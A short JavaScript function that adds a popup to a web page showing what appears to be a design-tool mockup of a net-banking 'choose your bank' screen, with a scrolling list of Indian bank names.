const showPopup = async () => {
    const popup = document.createElement("div");
	popup.setAttribute("id", "NETBANKING");
    popup.classList.add("popup");
    const popupMain = document.createElement("div");
	popup.setAttribute("id", "NETBANKING");
    popupMain.classList.add("popup-main");

    const content = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<title>CC Input – Choose Your Bank Scroll</title>
<link rel="stylesheet" type="text/css" id="applicationStylesheet" href="css/stylesss.css"/>
<script id="applicationScript" type="text/javascript" src="scripts/scriptsss.js"></script>
</head>
<body>
<div id="CC_Input__Choose_Your_Bank_Scroll" onclick="application.goBack()">
	<svg class="Rectangle_50_b">
		<linearGradient id="Rectangle_50_b" spreadMethod="pad" x1="0.5" x2="0.5" y1="0" y2="1">
			<stop offset="0" stop-color="#d37eff" stop-opacity="1"></stop>
			<stop offset="1" stop-color="#410064" stop-opacity="1"></stop>
		</linearGradient>
		<rect id="Rectangle_50_b" rx="0" ry="0" x="0" y="0" width="383" height="201">
		</rect>
	</svg>
	<div id="Scroll_Group_2">
		<div id="Bank_of_Baroda_Bank_of_India_B">
			<span>Bank of Baroda<br/>Bank of India<br/>Bank of Maharashtra<br/>Canara Bank<br/>Central Bank of India<br/>Indian Bank<br/>Indian Overseas Bank<br/>Punjab and Sind Bank<br/>Punjab National Bank<br/>State Bank of India<br/>UCO Bank<br/>Axis Bank<br/>City Union Bank<br/>Citibank<br/>DCB Bank</span>
		</div>
	</div>
</div>
</body></html>`;
    popupMain.innerHTML = content;

    popup.appendChild(popupMain);

    document.getElementsByTagName("body")[0].appendChild(popup);
};
